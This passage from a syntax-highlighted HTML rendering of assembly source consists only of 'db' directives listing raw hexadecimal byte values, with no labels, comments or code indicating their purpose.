                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A3h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">023h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">097h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">094h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B2h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">
